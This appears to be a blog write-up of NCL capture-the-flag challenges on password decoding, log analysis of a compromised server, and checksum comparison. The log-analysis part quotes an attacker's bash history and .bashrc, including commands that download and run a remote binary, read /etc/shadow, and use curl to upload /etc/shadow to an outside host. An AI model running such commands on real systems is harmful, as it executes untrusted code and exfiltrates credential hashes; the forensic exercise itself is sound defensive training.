---
layout: single
title: "NCL CTF - Regular Season: Crypto & Log Analysis"
header:
  teaser: oth.png
  overlay_image: nebula.jpg
  caption: "[__NCL__](http://www.nationalcyberleague.org/)"
related: true
comments: true
---

The NCL Regular Season has finally come to an end, and I must say that I really enjoyed it! The challenges ranged in easy to hard difficulty, and really required some "out of the box" thinking and previous knowledge of coding, log analysis, forensics, and hacking!

Unfortunately I didn't have time to grab data on all the challenges as I was busy, and I didn't want to give out too many answers for future games! So I only grabbed those challenges that I personally thought were interesting, time consuming, or in general required some extra thinking.

I will split my Regular Season post into two parts: this one will cover Crypto & Log Analysis, while part 2 will cover WiFi Cracking & Exploitation.

So without me blabbering on.... let's get to it!

## Passwords:

<a href="/images/nclp-1.png"><img src="/images/nclp-1.png"></a>

<div class="rBorder" markdown="1">
<span style="color:red">1. __0x3736736f72746c6f76653231__</span>

Taking a look at this password, we can tell that it's in HexDecimal due to the 0x at the beginning. We can easily convert this to ASCII in out Terminal.

```console
root@kali:~# echo 0x3736736f72746c6f76653231 | xxd -r
76sortlove21
```

__Answer: 76sortlove21__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">2. __MjN3cml0dGVuY2hhbmdlNDM=__</span>

The "__=__" at the end of the file should be a clue that this is a base64 encoded password. We can decode it in our Terminal.

```console
root@kali:~# echo MjN3cml0dGVuY2hhbmdlNDM= | base64 --decode
23writtenchange43
```

__Answer: 23writtenchange43__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">3. __00110100 00110001 01100011 01101111 01101111 01101011 01110011 01110100 01100001 01110010 00110111 00110010__</span>

Just go to this [Binary to Ascii Converter](http://www.binaryhexconverter.com/binary-to-ascii-text-converter) and you will get the answer.

__Answer: 41cookstar72__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">4. __TkRadlluTmxjblpsYzJWMIpYSmhiRE16__</span>

This one was pretty interesting, it took me a little bit to figure out what encoding this was, after a while I figured out that this was double base64 encoded. So we can simply decode this in our Terminal two times.

```console
root@kali:~# echo TkRadlluTmxjblpsYzJWMIpYSmhiRE16 | base64 --decode
NDZvYnNlcnZlc2V0XJhbDMz
root@kali:~# echo NDZvYnNlcnZlc2V0XJhbDMz | base64 --decode
46observeset\�[
               �base64: invalid input
```

__Answer: 46observeset__
</div>

## Compromise:

<a href="/images/nclp-2.png"><img src="/images/nclp-2.png"></a>

For this challenge we are provided the following file: [NCL-2016-Game2-Compromise.zip](https://jhalon.github.io/download/NCL-2016-Game2-Compromise.zip)

<div class="rBorder" markdown="1">
<span style="color:red">1. __From what URL did the hacker download malware from?__</span>

Since this is a Folder instead of a file, we have to dig through it and see what’s in there.

```console
root@kali:~# cd Downloads/
root@kali:~/Downloads# cd NCL-2016-Game2-Compromise/
root@kali:~/Downloads/NCL-2016-Game2-Compromise# cd dir
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir#
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls
application  docs  README.md
```

We can see that we have a README file, documents for the game, and the application itself. Now this is the "trick" part, there is nothing in these folders. We actually have to dig a little deeper! Since they say the hackers tried to break into a "server" we can assume that these files were being hosted... so let's check for all "hidden" files in the folder.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls -a
.  ..  application  .bash_history  .bashrc  docs  README.md
```

After listing all files, we can see that we have the bash history and the interactive bash shell script. So first thing we can do is check the bash history for commands that the hacker could have ran on the server.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

Looking into the output of the file, we can see that [Lynx](https://linux.die.net/man/1/lynx) is being used, which is a command line web browser. This would be the URL that is downloading the malware.

__Answer: http://216.242.103.2:8882/foo__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">2. __What is the port hosting the malware download?__</span>

Simple... just look at the URL Port on answer 1.

__Answer: 8882__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">3. __What is the PID of the program that the hacker killed?__</span>

Back in the output - let's look for the [ps](https://linux.die.net/man/1/ps) command and see what PID its killing.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: 12432__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">4. __What is the IP range the hacker scanned (use the exact argument)?__</span>

Well "scanned" is the keyword here, so let's look for [Nmap](https://nmap.org/book/man-briefoptions.html)!

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: 192.168.2.1/32__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">5. __What is the first file the hacker modified the contents of?__</span>

We simply have to look for a file editor that is being used. In this one it seems [vim](https://en.wikipedia.org/wiki/Vim_(text_editor)) is being used. Try not to get confused with the first few lines! Look past the [whoami](https://en.wikipedia.org/wiki/Whoami) command that is being used by the hacker after the certain "breach".

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: vim ~/.bashrc__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">6. __What is the second file the hacker modified the contents of?__</span>

Same as above... just look at the next vim edit!

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: vim /etc/hosts__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">7. __What is the URL that the hacker uses to process uploads of the /etc/shadow file (use the full URL, including port)?__</span>

For this one the answer won't be in the bash history... but it will be in the bash shell script. This might be due to the fact that the hacker had no admin permissions and needed a way to upload the file - thus the __.bashrc__ might have improper permissions set, giving all users "root" privilege.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls -a
.  ..  application  .bash_history  .bashrc  docs  README.md
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

---snip---

curl \
  -F "image=@/etc/shadow" \
  http://216.242.103.2:3000/uploader.php
```
__Answer: http://216.242.103.2:3000/uploader.php__
</div>

## Checksums:

<a href="/images/nclp-3.png"><img src="/images/nclp-3.png"></a>

For this challenge we are provided the following file: [NCL-2016-Game2-CorruptedHash.txt](https://jhalon.github.io/download/NCL-2016-Game2-CorruptedHash.txt)

<div class="rBorder" markdown="1">
<span style="color:red">1. __How many unique entries are there in this log?__</span>

```console
root@kali:~# cd Downloads/
root@kali:~/Downloads# cat NCL-2016-Game2-CorruptedHash.txt 
623d9157017ca3805cbbca653724f8e25a52be689f821d0c608f94717342e1e2  node-v0.1.100.tar.gz
44b08c5c9bd0c23d79d447bc67e1767ec1350a02cec0da6e5ce4c7f790b4e773  node-v0.1.101.tar.gz
bd9b1d09ad40ceaef4bdd46019960c5c2fe87026c9598a6fb23c66457510a22d  node-v0.1.102.tar.gz
7482b898a0f9514c74137b490c3ad0810ee5ce1586e8886c5182f6446e56711e  node-v0.1.103.tar.gz
a1c776f44bc07305dc0e56df17cc3260eaafa0394c3b06c27448ad85bec272df  node-v0.1.104.tar.gz
---snip---
```

```console
root@kali:~/Downloads# cat NCL-2016-Game2-CorruptedHash.txt | sort | uniq -u | wc -l
5012
```

__Answer: 5012__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">2. __What is the first file entry that does not match the official checksum?__</span>

Here is where it gets a little hard. First we have to navigate to the [NodeJS Distribution Page](https://nodejs.org/dist/). This page contains all the Checksums per version.

<a href="/images/ncl-nj-1.png"><img src="/images/ncl-nj-1.png"></a>

In each version link we will have something called __SHASUMS256.txt__.

<a href="/images/ncl-nj-2.png"><img src="/images/ncl-nj-2.png"></a>

This text contains the SHA256 Hash Checksum for each "official" version, which will look like something below...

```
623d9157017ca3805cbbca653724f8e25a52be689f821d0c608f94717342e1e2  node-v0.1.100.tar.gz
```

From here we need to grab each Hash Text File and compare it to the Corrupted Hash file we have. To accomplish this, we will use a tool called [WGET](https://www.gnu.org/software/wget/) to grab the contents of each file and print them out to a text file.

We will thus run the following command, which will grab each version file -- this might take a while, so let it run!

```console
root@cryptic:~# wget -O - https://nodejs.org/dist/v{0..7}.{0..12}.{0..48}/SHASUMS256.txt >> file

--2016-11-20 14:42:59--  https://nodejs.org/dist/v0.0.0/SHASUMS256.txt
Resolving nodejs.org (nodejs.org)... 104.20.22.46, 104.20.23.46, 2400:cb00:2048:1::6814:172e, ...
Connecting to nodejs.org (nodejs.org)|104.20.22.46|:443... connected.
HTTP request sent, awaiting response... 404 Not Found
2016-11-20 14:42:59 ERROR 404: Not Found.

--2016-11-20 14:42:59--  https://nodejs.org/dist/v0.0.1/SHASUMS256.txt
Reusing existing connection to nodejs.org:443.
HTTP request sent, awaiting response... 404 Not Found
2016-11-20 14:43:00 ERROR 404: Not Found.

---snip---
```

Once that's completed... you will have a full listing of all the SHA256 Check Sums in the file called "__file__"

What I did to make life easy was go to [QuickDiff](http://www.quickdiff.com/) to compare the list we made against the Corrupted Hashes we downloaded. Now all we need to do is scroll down the list and find the RED/GREEN highlights, which will be our answer.

<a href="/images/ncl-nj-3.png"><img src="/images/ncl-nj-3.png"></a>

__Answer: node-v4.0.0-darwin-x64.tar.gz__
</div>

<div class="rBorder" markdown="1">
<span style="color:red">3. __What is the second file entry that does not match the official checksum?__</span>

If we keep scrolling, we will find the 2nd one toward the bottom of the page.

<a href="/images/ncl-nj-4.png"><img src="/images/ncl-nj-4.png"></a>

__Answer: node-v7.1.0.pkg__
</div>

Thanks for reading! And stay tuned for Part 2 of the NCL Regular Season!
